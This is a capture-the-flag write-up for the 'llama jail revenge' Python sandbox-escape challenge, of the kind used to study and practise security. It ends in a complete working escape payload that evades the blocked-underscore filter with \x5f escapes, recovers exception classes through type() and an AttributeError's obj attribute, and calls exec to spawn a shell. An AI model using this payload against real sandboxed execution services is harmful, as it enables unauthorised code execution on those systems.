# llama jail revenge

## challenge

llama-jail-1 had a funny. To people planning to use other libraries in ctf challs, don't be me and not read the code used LOL.

see [llama-jail-revenge.zip](./llama-jail-revenge.zip)

## solution

i recommend checking out [llama-jail](../llama-jail) first

so this revenge chall was created because the first one used iter_child_nodes instead of walk

i had no clue what to do at first, mostly because the `_` char is blocked which makes this a lot lot harder.

also no-one was able to solve this challenge so there was a hint released for it, stating the following

```
HINT: type is pretty good, wonder if we can somehow get exception classes from that
```

now, the dockerfile stated that the version of python used was 3.12, which introduced the new type keyword. i tried this for a few hours but then gave up

i also saw the type function, and also assumed that to be useless since nothing we could access had a type that inherited from exception

however, the type function actually has a second use, which is that it can be used to construct arbitrary classes (sort of)

`help(type)` shows the following

```py
Help on class type in module builtins:

class type(object)
 |  type(object) -> the object's type
 |  type(name, bases, dict, **kwds) -> a new type
```

interestingly, we can use the `dict` param of the type fn with 3 args to get arbitrary setattr on a new object. with this, we can overwrite the dunder methods of the new object.

lets take a look at [all the dunder methods](https://www.pythonmorsels.com/every-dunder-method/)

oh hey look at this

![image](https://github.com/quasar098/pyjail-collection/assets/70716985/b485779e-f742-4a40-b52e-874c6d744c63)

so if we overwrite the enter function to be some lambda, and the exit function to also be a lambda that lets us get the exception class, we can get further in this jail.

```py
stuff = []

newtype = type("newtype", (), {"\x5f\x5fexit\x5f\x5f": lambda self,a,b,c: [False, stuff.append(type.mro(type(b))[2]), stuff.append(type.mro(type(b))[-1])][0], "\x5f\x5fenter\x5f\x5f": lambda self: self})

try:
    with newtype() as newobj:
        1/0
except:
    pass

exception, obj = stuff
```

i use the `\x5f` in the strings above because no `_` are allowed

i knew that once we get exception classes, it is super easy to win because of this trick i learned while doing pyquinejailgolf in amateursctf i think it was

the trick is that we can use the attributes of an AttributeError object when doing a format string in python

```py
try:
    "{0.__getattribute__.q}".format(object)
except Exception as e:
    print(dir(e))
```

the above prints out the below

```py
['__cause__', '__class__', '__context__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setstate__', '__sizeof__', '__str__', '__subclasshook__', '__suppress_context__', '__traceback__', 'add_note', 'args', 'name', 'obj', 'with_traceback']
```

there is an attribute called obj which is the object we tried to access the attribute of.

so, we now have getattr and winning is super easy with a standard pyjail escape

```py
stuff = []

newtype = type("newtype", (), {"\x5f\x5fexit\x5f\x5f": lambda self,a,b,c: [False, stuff.append(type.mro(type(b))[2]), stuff.append(type.mro(type(b))[-1])][0], "\x5f\x5fenter\x5f\x5f": lambda self: self})

try:
    with newtype() as newobj:
        1/0
except:
    pass

exception, obj = stuff

try:
    "{0.\x5f\x5fgetattribute\x5f\x5f.q}".format(obj)
except exception as e:
    ga = e.obj
    print(ga(ga([q for q in ga(obj, "\x5f\x5fsub\x63lasses\x5f\x5f")() if "warning" in f'{q}'][-1], "\x5f\x5finit\x5f\x5f"), "\x5f\x5fglobals\x5f\x5f")["\x5f\x5fbuiltins\x5f\x5f"]["exec"]("import os\nos\x2esystem('sh')"))
#EOF
```

then we have a shell and can retrieve the flag
